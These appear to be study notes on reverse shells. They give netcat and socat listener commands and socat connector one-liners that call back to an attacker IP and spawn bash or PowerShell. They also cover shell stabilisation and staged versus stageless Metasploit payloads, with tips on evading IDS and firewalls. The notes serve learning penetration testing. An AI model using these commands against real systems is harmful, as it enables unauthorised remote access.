```Bash

```

## Netcat
The syntax for starting a netcat listener using Linux is this:
```Bash
nc -lvnp <port-number>
```
Be aware that if you choose to use a port below 1024, you will need to use sudo when starting your listener. That said, it's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.

## Socat
Although, it is same as netcat, but the real difference for which we would prefer this is encrypted shells. This often bypasses IDS system.

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:
```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
We then need to merge the two created files into a single .pem file:
```bash
cat shell.key shell.crt > shell.pem
```
Now, when we set up our reverse shell listener, we use below command to listen on a port:
```bash
Listener -
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
Connector -
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
For Windows Target-
```bash
Listener -
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
Connector -
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:"powershell.exe,pipes"
```
## Shell Stablize
### Using Python
```Bash
python -c 'import pty;pty.spawn("/bin/bash")'
```
This will give us access to term commands such as clear - 
```Bash
export TERM=xterm
```
Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

### Using rlwrap
To use rlwrap, we invoke a slightly different listener:
```Bash
rlwrap nc -lvnp <port>
```
Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. 

## Metasploit Payloads
Before we go any further, there are another two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.

**Staged** payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.

**Stageless** payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

***For example*** - **shell_reverse_tcp**. This indicates that it was a stageless payload. How? Stageless payloads are denoted with underscores (_). The staged equivalent to this payload would be: **shell/reverse_tcp**
